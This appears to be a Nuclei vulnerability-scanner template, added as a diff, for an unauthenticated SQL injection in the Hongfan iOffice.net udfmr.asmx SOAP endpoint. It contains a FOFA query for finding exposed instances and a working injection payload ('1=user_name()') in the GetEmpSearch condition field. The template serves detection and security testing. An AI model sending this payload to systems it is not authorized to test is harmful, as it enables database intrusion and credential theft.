@@ -1,0 +1,47 @@
+id: hongfan-ioffice-udfmr-asmx-sqli
+
+info:
+  name: 红帆ioffice udfmr接口SQL注入
+  author: hufei
+  severity: critical
+  description:  红帆iOffice.net udfmr.asmx接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/132365842
+  tags: hongfan,ioffice,sql,oa
+  metadata:
+    veified: true
+    fofa-query: app="红帆-ioffice"
+    max-request: 2
+
+http:
+  - raw:
+      - |
+        GET /iOffice/prg/set/wss/udfmr.asmx?op=GetEmpSearch HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'soap')"
+
+
+  - raw:
+      - |
+        POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+              <condition>1=user_name()</condition>
+            </GetEmpSearch>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 500 && contains(body_2,'soap')"
